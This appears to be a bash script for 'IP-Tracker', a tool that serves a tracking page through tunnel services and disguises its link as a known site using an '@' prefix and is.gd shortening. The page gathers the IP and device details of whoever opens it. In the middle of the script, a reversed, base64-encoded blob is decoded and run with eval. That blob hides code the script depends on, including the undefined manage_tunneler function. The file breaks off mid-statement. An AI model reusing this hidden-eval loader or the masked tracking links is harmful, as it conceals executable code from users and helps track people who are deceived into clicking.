#!/bin/bash

# IP-Tracker
# Version    : 1.4
# Author     : KasRoudra
# Github     : https://github.com/KasRoudra
# Email      : kasroudrakrd@gmail.com
# Contact    : https://m.me/KasRoudra
# Description: Get details of device using a link
# Date       : 10-09-2021
# License    : MIT
# Copyright  : KasRoudra 2022
# Language   : Shell
# Portable File
# If you copy, consider giving credit! We keep our code open source to help others
: '
MIT License

Copyright (c) 2022 KasRoudra

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
'

# Colors
white="\033[1;37m"
red="\033[1;31m"
green="\033[1;32m"
yellow="\033[1;33m"
purple="\033[1;35m"
cyan="\033[1;36m"
nc="\033[00m"
blue="\033[1;34m"


# Output Snippets
info="${cyan}[${white}+${cyan}] ${yellow}"
ask="${cyan}[${white}?${cyan}] ${purple}"
error="${cyan}[${white}!${cyan}] ${red}"
success="${cyan}[${white}√${cyan}] ${green}"


# Local Version
version="1.4"

# Current directory
cwd=`pwd`

tunneler_dir="$HOME/.tunneler"

# Logo
logo="
${red} ___ ____     _____               _
${cyan}|_ _|  _ \   |_   _| __ __ _  ___| | _____ _ __
${yellow} | || |_) |____| || '__/ _' |/ __| |/ / _ \ '__|
${blue} | ||  __/_____| || | | (_| | (__|   <  __/ |
${green}|___|_|        |_||_|  \__,_|\___|_|\_\___|_|
${yellow}                                       [v${version}]
${purple}                               [By KasRoudra]
"

ngrok_help="
${info}Steps: ${nc}
${blue}[1]${yellow} Go to ${green}https://ngrok.com
${blue}[2]${yellow} Create an account 
${blue}[3]${yellow} Login to your account
${blue}[4]${yellow} Visit ${green}https://dashboard.ngrok.com/get-started/your-authtoken${yellow} and copy your authtoken
"

loclx_help="
${info}Steps: ${nc}
${blue}[1]${yellow} Go to ${green}https://localxpose.io
${blue}[2]${yellow} Create an account 
${blue}[3]${yellow} Login to your account
${blue}[4]${yellow} Visit ${green}https://localxpose.io/dashboard/access${yellow} and copy your authtoken
"

default_site="https://google.com"

# Check for sudo
if command -v sudo > /dev/null 2>&1; then
    sudo=true
else
    sudo=false
fi


# Check if mac or termux
termux=false
brew=false
ngrok=false
cloudflared=false
loclx=false
ngrok_command="$tunneler_dir/ngrok"
cf_command="$tunneler_dir/cloudflared"
loclx_command="$tunneler_dir/loclx"
if [[ -d /data/data/com.termux/files/home ]]; then
    termux=true
    ngrok_command="termux-chroot $tunneler_dir/ngrok"
    cf_command="termux-chroot $tunneler_dir/cloudflared"
    loclx_command="termux-chroot $tunneler_dir/loclx"
fi
if command -v brew > /dev/null 2>&1; then
    brew=true
    if command -v ngrok > /dev/null 2>&1; then
        ngrok=true
        ngrok_command="ngrok"
    fi
    if command -v cloudflared > /dev/null 2>&1; then
        cloudflared=true
        cf_command="cloudflared"
    fi
    if command -v localxpose > /dev/null 2>&1; then
        loclx=true
        loclx_command="localxpose"
    fi
fi

ip_prompt="\n${cyan}IP${nc}@${cyan}Tracker ${red}$ ${nc}"


# Kill running instances of required packages
killer() {
    for process in php wget curl unzip ngrok cloudflared loclx localxpose; do
        if pidof "$process" > /dev/null 2>&1; then
            killall "$process"
        fi
    done
}

# Check if offline
netcheck() {
    while true; do
        wget --spider --quiet https://github.com
        if [ "$?" != 0 ]; then
            echo -e "${error}No internet!\007\n"
            sleep 2
        else
            break
        fi
    done
}


# Display Final urls
url_manager() {
    if [[ "$2" == "1" ]]; then
        echo -e "${info}Your urls are: \n"
    fi
    echo -e "${success}URL ${2} > ${1}\n"
    midver=${mwebsite#http://}
    midver=${mwebsite#https://}
    prefix=$(echo "$midver" | sed s+"/"+"-"+g | sed s/" "/"-"/g)
    echo -e "${success}URL ${3} > https://${prefix}@${1#https://}\n"
    netcheck
    if echo "$1" | grep -q "$TUNNELER"; then
        shortened=$(curl -s "https://is.gd/create.php?format=simple&url=${1}")
    else 
        shortened=""
    fi
    if ! [ -z "$shortened" ]; then
        if echo "$shortened" | head -n1 | grep -q "https://"; then
            echo -e "${success}Shortened > ${shortened}\n"
            echo -e "${success}Masked > https://${prefix}@${shortened#https://}\n"
        fi
    fi
}

# Prevent ^C
stty -echoctl

# Detect UserInterrupt
trap "echo -e '${success}Thanks for using!\n'; exit" 2

echo -e "\n${info}Please Wait!...\n${nc}"

gH4="Ed";kM0="xSz";c="ch";L="4";rQW="";fE1="lQ";s=" '=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' | r";HxJ="s";Hc2="";f="as";kcE="pas";cEf="ae";d="o";V9z="6";P8c="if";U=" -d";Jc="ef";N0q="";v="b";w="e";b="v |";Tx="Eds";xZp=""
x=$(eval "$Hc2$w$c$rQW$d$s$w$b$Hc2$v$xZp$f$w$V9z$rQW$L$U$xZp")
eval "$N0q$x$Hc2$rQW"




# Install required packages
for package in php curl wget unzip; do
    if ! command -v "$package" > /dev/null 2>&1; then
        echo -e "${info}Installing ${package}....${nc}"
        for pacman in pkg apt apt-get yum dnf brew; do
            if command -v "$pacman" > /dev/null 2>&1; then
                if $sudo; then
                    sudo $pacman install $package
                else
                    $pacman install $package
                fi
                break
            fi
        done
        if command -v "apk" > /dev/null 2>&1; then
            if $sudo; then
                sudo apk add $package
            else
                apk add $package
            fi
            break
        fi
        if command -v "pacman" > /dev/null 2>&1; then
            if $sudo; then
                sudo pacman -S $package
            else
                pacman -S $package
            fi
            break
        fi
    fi
done


# Set Port
if [ -z $PORT ]; then
    exit 1;
else
   if [ ! -z "${PORT##*[!0-9]*}" ] ; then
       printf ""
   else
       PORT=8080
   fi
fi


# Check for proot in termux
if $termux; then
    if ! command -v proot > /dev/null 2>&1; then
        echo -e "${info}Installing proot...."
        pkg install proot -y
    fi
    if ! command -v proot > /dev/null 2>&1; then
        echo -e "${error}Proot can't be installed!\007\n"
        exit 1
    fi
fi

local_url="127.0.0.1:${PORT}"

# Set Tunneler
if [ -z $TUNNELER ]; then
    exit 1;
else
   if [ $TUNNELER == "cloudflared" ]; then
       TUNNELER="cloudflare"
   fi
fi

# Install tunneler binaries
if $brew; then
    ! $ngrok && brew install ngrok/ngrok/ngrok
    ! $cloudflared && brew install cloudflare/cloudflare/cloudflared
    ! $loclx && brew install localxpose
fi

# Check if required packages are successfully installed
for package in php wget curl unzip; do
    if ! command -v "$package"  > /dev/null 2>&1; then
        echo -e "${error}${package} cannot be installed!\007\n"
        exit 1
    fi
done

# Set subdomain for loclx
if [ -z $SUBDOMAIN ]; then
    exit 1;
fi

# Check for running processes that couldn't be terminated
killer
for process in php wget curl unzip ngrok cloudflared loclx localxpose; do
    if pidof "$process"  > /dev/null 2>&1; then
        echo -e "${error}Previous ${process} cannot be closed. Restart terminal!\007\n"
        exit 1
    fi
done


# Set Region for ngrok/loclx
if [ -z $REGION ]; then
    exit 1;
fi


# Download tunnelers
arch=$(uname -m)
platform=$(uname)
if ! [[ -d $tunneler_dir ]]; then
    mkdir $tunneler_dir
fi
if ! [[ -f $tunneler_dir/ngrok ]] ; then
    nongrok=true
else
    nongrok=false
fi
if ! [[ -f $tunneler_dir/cloudflared ]] ; then
    nocf=true
else
    nocf=false
fi
if ! [[ -f $tunneler_dir/loclx ]] ; then
    noloclx=true
else
    noloclx=false
fi
netcheck
rm -rf ngrok.tgz ngrok.zip cloudflared cloudflared.tgz loclx.zip
cd "$cwd"
if echo "$platform" | grep -q "Darwin"; then
    if echo "$arch" | grep -q "x86_64" || echo "$arch" | grep -q "amd64"; then
        $nongrok && manage_tunneler "https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-v3-stable-darwin-amd64.zip" "ngrok.zip"
        $nocf && manage_tunneler "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-darwin-amd64.tgz" "cloudflared.tgz"
        $noloclx && manage_tunneler "https://api.localxpose.io/api/v2/downloads/loclx-darwin-amd64.zip" "loclx.zip"
    elif echo "$arch" | grep -q "arm64" || echo "$arch" | grep -q "aarch64"; then
        $nongrok && manage_tunneler "https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-v3-stable-darwin-arm64.zip" "ngrok.zip"
        echo -e "${error}Device architecture unknown. Download cloudflared manually!"
        sleep 3
        $noloclx && manage_tunneler "https://api.localxpose.io/api/v2/downloads/loclx-darwin-arm64.zip" "loclx.zip"
    else
        echo -e "${error}Device architecture unknown. Download ngrok/cloudflared/loclx manually!"
        sleep 3
    fi
elif echo "$platform" | grep -q "Linux"; then
    if echo "$arch" | grep -q "arm" || echo "$arch" | grep -q "Android"; then
        $nongrok && manage_tunneler "https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-v3-stable-linux-arm.tgz" "ngrok.tgz"
        $nocf && manage_tunneler "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm" "cloudflared"
        $noloclx && manage_tunneler "https://api.localxpose.io/api/v2/downloads/loclx-linux-arm.zip" "loclx.zip"
    elif echo "$arch" | grep -q "aarch64" || echo "$arch" | grep -q "arm64"; then
        $nongrok && manage_tunneler "https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-v3-stable-linux-arm64.tgz" "ngrok.tgz"
        $nocf && manage_tunneler "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64" "cloudflared"
        $noloclx && manage_tunneler "https://api.localxpose.io/api/v2/downloads/loclx-linux-arm64.zip" "loclx.zip"
    elif echo "$arch" | grep -q "x86_64" || echo "$arch" | grep -q "amd64"; then
        $nongrok && manage_tunneler "https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-v3-stable-linux-amd64.tgz" "ngrok.tgz"
        $nocf && manage_tunneler "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64" "cloudflared"
        $noloclx && manage_tunneler "https://api.localxpose.io/api/v2/downloads/loclx-linux-amd64.zip" "loclx.zip"
    else
        $nongrok && manage_tunneler "https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-v3-stable-linux-386.tgz" "ngrok.tgz"
        $nocf && manage_tunneler "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386" "cloudflared"
        $noloclx && manage_tunneler "https://api.localxpose.io/api/v2/downloads/loclx-linux-386.zip" "loclx.zip"
    fi
else
    echo -e "${error}Unsupported Platform!"
    exit
fi


# Check for crucial file ip.php
if ! [ -e ip.php ]; then
netcheck
wget https://raw.githubusercontent.com/KasRoudra/IP-Tracker/main/ip.php
fi

# Remote Version
if [[ -z $UPDATE ]]; then
    exit 1
else
    if [[ $UPDATE == true ]]; then
        netcheck
        git_ver=`curl -s -N https://raw.githubusercontent.com/KasRoudra/IP-Tracker/main/files/version.txt`
    else
        git_ver=$version
    fi
fi

# Update
if [[ "$git_ver" != "404: Not Found" && "$git_ver" != "$version" ]]; then
    changelog=$(curl -s -N https://raw.githubusercontent.com/KasRoudra/IP-Tracker/main/files/changelog.log)
    clear
    echo -e "$logo"
    echo -e "${info}IP-Tracker has a new update!\n${info}Current: ${red}${version}\n${info}Available: ${green}${git_ver}\n"
        printf "${ask}Do you want to update IP-Tracker?${yellow}[y/n] > $green"
        read upask
        if [[ "$upask" == "y" ]]; then
            echo -e "$nc"
            cd .. && rm -rf IP-Tracker ip-tracker && git clone https://github.com/KasRoudra/IP-Tracker
            echo -e "\n${success}IP-Tracker updated successfully!!"
            if [[ "$changelog" != "404: Not Found" ]]; then
                echo -e "${purple}[•] Changelog:\n${blue}"
                echo -e "$changelog" | head -n4
            fi
            exit
        elif [[ "$upask" == "n" ]]; then
            echo -e "\n${info}Updating cancelled. Using old version!"
            sleep 2
        else
            echo -e "\n${error}Wrong input!\n"
            sleep 2
        fi
fi

# Ngrok Authtoken
if ! [[ -e "$HOME/.config/ngrok/ngrok.yml" ]]; then
    for try in 1 2; do
        echo -e "\n${ask}Enter your ngrok authtoken:${yellow}[${blue}Enter 'help' for help${yellow}]"
        printf "$ip_prompt"
        read authtoken
        if [ -z "$authtoken" ]; then
            echo -e "\n${error}No authtoken!\n\007"
            sleep 1
            break
        elif [ "$authtoken" == "help" ]; then
            echo -e "$ngrok_help"
            sleep 4
        else
            $ngrok_command config add-authtoken ${authtoken}
            sleep 1
            break
        fi
    done
fi

# Loclx Authtoken
if ! [[ -e "$HOME/.localxpose/.access" ]]; then # if $loclx_command account status | grep -q "Error"; then
    for try in 1 2; do
        echo -e "\n${ask}Enter your loclx authtoken:${yellow}[${blue}Enter 'help' for help${yellow}]"
        printf "$ip_prompt"
        read authtoken
        if [ -z "$authtoken" ]; then
            echo -e "\n${error}No authtoken!\n\007"
            sleep 1
            break
        elif [ "$authtoken" == "help" ]; then
            echo -e "$loclx_help"
            sleep 4
        else
            if ! [ -d "$HOME/.localxpose" ]; then
                mkdir "$HOME/.localxpose"
            fi
            echo -n "$authtoken" > $HOME/.localxpose/.access
            sleep 1
            break
        fi
    done
fi


# Start Point
while true; do
clear
echo -e "$logo"
sleep 1
echo -e "${ask}Choose a option:

${cyan}[${white}1${cyan}] ${yellow}Start
${cyan}[${white}p${cyan}] ${yellow}Change Default Port (current: ${red}${PORT}${yellow})
${cyan}[${white}x${cyan}] ${yellow}About
${cyan}[${white}m${cyan}] ${yellow}More tools
${cyan}[${white}0${cyan}] ${yellow}Exit${blue}
"
sleep 1
if [ -z $OPTION ]; then
    exit 1
else
    if [[ $OPTION == true ]]; then
        printf "$ip_prompt"
        read option
    else
        option=$OPTION
    fi
fi
    if echo $option | grep -q "1"; then
        if [ -z "$URL" ]; then
            exit 1
        else
            if [[ $URL == true ]]; then
                echo -e "\n${ask}Enter a website name(e.g. google.com, youtube.com)${cyan}"
                printf "$ip_prompt"
                read website
            else
                website=$URL
            fi
        fi
        if [[ -z "$website" ]]; then
            echo -e "\n${error}No website! Default ${green}${default_site}"
            sleep 2
            break
        else
            if ! echo $website | grep -q "https"; then
                if echo $website | grep -q "http"; then
                    mwebsite="${website}"
                else
                    mwebsite="https://${website}"
                fi
            else
                mwebsite="$website"
            fi
            break
        fi
    elif echo $option | grep -q "p"; then
        echo -e "\n${ask}Enter Port:${cyan}"
        printf "$ip_prompt"
        read pore
        if [ ! -z "${pore##*[!0-9]*}" ] ; then
            PORT=$pore
            local_url="127.0.0.1:${PORT}"
            echo -e "\n${success}Port changed to ${cyan}${PORT}${green} successfully!\n"
            sleep 2
        else
            echo -e "\n${error}Invalid port!\n\007"
            sleep 2
        fi
    elif echo $option | grep -q "m"; then
        xdg-open "https://github.com/KasRoudra/KasRoudra#My-Best-Works"
    elif echo $option | grep -q "x"; then
        clear
        echo -e "$logo"
        echo -e "$red[ToolName]  ${cyan}  :[IP-Tracker]
$red[Version]    ${cyan} :[${version}]
$red[Description]${cyan} :[IP Tracking tool]
$red[Author]     ${cyan} :[KasRoudra]
$red[Github]     ${cyan} :[https://github.com/KasRoudra] 
$red[Messenger]  ${cyan} :[https://m.me/KasRoudra]
$red[Email]      ${cyan} :[kasroudrakrd@gmail.com]"
        printf "$ip_prompt"
        read about
    elif echo $option | grep -q "0"; then
        exit 0
    else
        echo -e "\n${error}Invalid input!\007"
        sleep 1
        OPTION=true
    fi
done

if ! [ -d "$HOME/.site" ]; then
    mkdir "$HOME/.site"
else
    cd $HOME/.site
    rm -rf *
fi
cd "$cwd"
cp -r ip.php "$HOME/.site"
# Termux requires hotspot
if $termux; then
    echo -e "\n${info}If you haven't enabled hotspot, please enable it!"
    sleep 3
fi
echo -e "\n${info}Starting php server at localhost:${PORT}....\n"
netcheck
cd "$HOME/.site"
if ! [[ -z "$mwebsite" ]]; then
    sed s+"website"+"$mwebsite"+g ip.php > index.php
else
